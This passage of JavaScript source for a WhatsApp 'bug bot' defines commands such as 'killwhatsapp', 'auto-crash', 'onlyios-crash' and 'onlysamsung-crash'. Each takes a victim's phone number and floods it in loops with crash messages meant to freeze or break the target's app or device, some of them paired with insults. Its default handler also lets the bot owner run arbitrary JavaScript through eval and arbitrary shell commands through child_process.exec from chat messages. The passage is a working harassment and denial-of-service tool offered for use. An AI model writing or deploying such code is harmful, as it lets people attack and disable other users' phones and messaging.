if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H`}, {quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'killwhatsapp':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY RXHL`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY RXHL`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY RXHL`},{quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'auto-crash':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Bang Balikin Duit Gua😭😭*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Bang Balikin Duit Gua😭😭*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Bang Balikin Duit Gua😭😭*`}, {quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'new-bunga':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Flower 🌷*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Flower 🌷*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Flower 🌷*`}, {quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'kill-ripper':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Mampus Lu Ripper Kontol*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Mampus Lu Ripper Kontol*`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `*Mampus Lu Ripper Kontol*`}, {quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'external-crash1': case 'external-crash2': case 'external-crash3': case 'internal-crash1': case 'internal-crash2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await ngeloc(Pe, force)
await sendListMessage(Pe)
await bakdok(Pe, force)
await penghitaman(Pe, force)
await sendSystemCrashMessage(Pe)
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {text: `${command} ✅`}, {quoted: force})
await sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'onlyios-crash':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 5; j++) {
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
await sendBugIos(Pe)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

case 'onlysamsung-crash':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}*`)
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return replyz('*Only Vip*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return replyz(bang)}
try {
replyz(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
replyz(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await replyz(evaled)
} catch (err) {
await replyz(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return replyz(`${err}`)
if (stdout) return replyz(stdout)
})
}

}
} catch (err) {
rxhl.sendMessage(m.chat, {text: require('util').format(err)}, {quoted: m})
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})

